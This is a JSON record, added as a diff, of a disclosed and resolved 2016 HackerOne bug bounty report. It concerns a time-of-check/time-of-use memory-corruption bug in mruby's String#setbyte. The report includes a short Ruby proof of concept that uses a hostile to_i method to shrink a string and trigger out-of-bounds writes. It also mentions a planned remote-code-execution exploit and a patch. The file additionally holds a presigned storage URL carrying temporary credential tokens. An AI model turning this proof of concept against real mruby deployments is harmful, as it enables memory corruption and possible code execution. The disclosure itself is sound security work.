@@ -1,0 +1,202 @@
+{
+  "id": 181893,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODE4OTM=",
+  "url": "https://hackerone.com/reports/181893",
+  "title": "TOCTTOU bug in mrb_str_setbyte leading the memory corruption",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2016-11-13T09:43:49.735Z",
+  "submitted_at": "2016-11-13T09:43:49.735Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "raydot",
+    "url": "/raydot",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15668,
+    "url": "https://hackerone.com/shopify-scripts",
+    "handle": "shopify-scripts",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "shopify-scripts",
+      "twitter_handle": "",
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2016-12-16T21:35:57.209Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-12-16T21:35:57.180Z",
+  "team_member_agreed_on_going_public_at": "2016-12-16T19:52:36.239Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The String#setbyte function caches the length of the string before loading the function arguments. Loading function arguments through mrb_get_args can call into ruby code to run type conversion methods (to_i, to_s and the like). A malicious conversion method is able to force the string to be reallocated shorter so that the setbyte goes on to overwrite out of bounds memory.\n\nFollowing is a POC that causes a native crash with under mruby on Mac OS X. I plan to follow up with a reliable RCE exploit against mruby-engine using this vulnerability in the next day or so.\n\n```\n$s = \"9\" + (\"\\n\" * (1024*1024-1))\n$k = []\n\nclass Tmp\n    def to_i\n        $k.push(\"a\"*1024)\n        $s.chomp! ''\n        $s.succ!\n        95\n    end\nend\ntmp = Tmp.new\n$s.setbyte(128, tmp)\nputs $k[0]\n```\n\nAttached is a patch to mruby to resolve this issue.",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 134443,
+      "file_name": "patch2.diff",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/134/443/1233a0c902fddfd27e2ca6f3de463366105f1a31/patch2.diff?response-content-disposition=attachment%3B%20filename%3D%22patch2.diff%22%3B%20filename%2A%3DUTF-8%27%27patch2.diff&response-content-type=text%2Fx-diff&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3DK7BU5K%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T064711Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDm5UkcianOVpT2dxHhYUFO2JJdi4xaD9w6djVtBYZASwIhANXZxm2j8oHu%2BP%2BkAqbXzU%2BKecKpDIQFUssbVExx7Jy5KrIFCH8QAxoMMDEzNjE5Mjc0ODQ5IgyDTl7d7vVnsdqLgOAqjwXnNXnYKYav0zdjYTPkVRXer%2FMwN2oqqrhfdNURd9ubM1WAp9zualVU2sWPVBIzAzLyEBUvF32oYKbsmEdMz%2BOT5tIYlVUJP9uinYkvmcDgFv1NCgizwcinvUA%2BHioTSSP4Ept1%2FunQf62b6n9qtxNg4QoI1qyNKlZwa2F%2BA2clysHg54E8gPBIN4HLgNM3XGdb9eIFBQTPjRZP9zgDoCXlGlHuXgZp%2BGqrlss1lhSSEXeoHrCkNL%2BR9iWEYXgUxQNv80lJqNIufItu8Xib6HzyanXoOdF1TwuPiZygndvcAnqOFJO%2BLGSt95CXOfYjNz05uh%2FJLWUKJ9mmbgQOogRg%2Fs2m7kwJHmdBPpZxRsrzqQpevupufGCO5jxvuWzrkegVMUQJkroi1nizwO3JrNfVc1LtNJVEGTmzxLPer8BP7S%2BTwq6%2F%2BoBd2pZ%2BclexBVvVdsgQTZJnAcLwV5YksWtqa5q5h7Vi%2B2lL9x0Vcm2F80oL8MY39N6URu14%2FV0ZvVUmSWNQBCMJverUPgwSJxE5fjHFqF%2FIYAymddI6rxUW3rVIgkfnPkQrqdiTGptQBVoXxU9dPVcB8t9tHN%2BtgGb%2BsR99jQOf%2B47DiVknLWL%2Fbe1P4syd3fDk5zERd%2FP3ALBU%2ByhXSN4pJ2Zbja7BSIHu356PYgNjzf8xQViKbGv2ldsZPrfJemVsIcCXL%2FZRC9%2BW%2Fm1G46AcgTwfyKyT8TmAF02MN01xoLloQiEohc%2BajN85Vnf2t%2FBXqkSkPmsLA1h0d%2BHLuMxR41Rk%2FGrJ6jk6l%2FemaRaTx%2FjrImK6LS6WTf%2Bz9nPEokZUR90uDg%2FJ5KxZnRXz8m7KUTsbjmIvjDvgYc%2FVAirPdFnU0pwvkoIcMK7Ht9IGOrAB9OAuM4ZuS7Ot0zodh6zUVsVU9aMBJovCDTfF8yFDXiVotiEC8Lmus9gNBc%2FOkg5EWNMF%2FNXeiPj8ndunzDi1Uo0Qdl%2BD73Qy2AkoASEWajogjtRYdbBnDNt8yYBaMFzSQlLBFWUZjt0ZUowCPDUmrFKmTgtpfrHbcPh2bgJbG5wTsKIBKJVo7EbjLXawp7VOziqIlCPyh9ctyqpWxvP7sVo3U0ZgwfbNyEUQ%2F31RTrY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=abebb27daefc816151ba728af837095ffa2ae3636beb6721b51b5f1b189a53d1",
+      "file_size": 564,
+      "type": "text/x-diff",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-01-15T19:52:36.266Z",
+  "allow_singular_disclosure_after": -298983275.24827313,
+  "singular_disclosure_allowed": true,
+  "vote_count": 23,
+  "voters": [
+    "beched",
+    "dkasak",
+    "r3y",
+    "mpz",
+    "eveeez",
+    "ak1t4",
+    "japz",
+    "paulos__",
+    "zerotoone",
+    "secbughunter",
+    "and 13 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "181893",
+  "votes": 23,
+  "latest_disclosable_activity_at": "2016-12-16T21:35:57.222Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T14:47:11.633072",
+    "source": "https://hackerone.com/reports/181893.json",
+    "report_id": 181893
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODE4OTM=",
+    "databaseId": "181893",
+    "title": "TOCTTOU bug in mrb_str_setbyte leading the memory corruption",
+    "url": "https://hackerone.com/reports/181893",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2016-12-16T21:35:57.209Z",
+    "created_at": "2016-11-13T09:43:49.735Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzcw",
+      "name": "Code Injection",
+      "external_id": "cwe-94"
+    },
+    "severity": {
+      "rating": "critical",
+      "score": null
+    },
+    "reporter": {
+      "username": "raydot"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzE1NjY4",
+      "handle": "shopify-scripts",
+      "name": "shopify-scripts",
+      "url": "https://hackerone.com/shopify-scripts",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8zODgwNw==",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2016-12-16T19:52:29.661Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzE4MTg5Mw==",
+    "_id": "181893",
+    "disclosed": true,
+    "votes": 23,
+    "latest_disclosable_activity_at": "2016-12-16T21:35:57.222Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODE4OTM=",
+      "databaseId": "181893",
+      "title": "TOCTTOU bug in mrb_str_setbyte leading the memory corruption",
+      "url": "https://hackerone.com/reports/181893",
+      "disclosed_at": "2016-12-16T21:35:57.209Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzE1NjY4",
+      "handle": "shopify-scripts",
+      "name": "shopify-scripts",
+      "url": "https://hackerone.com/shopify-scripts",
+      "currency": "usd"
+    }
+  }
+}
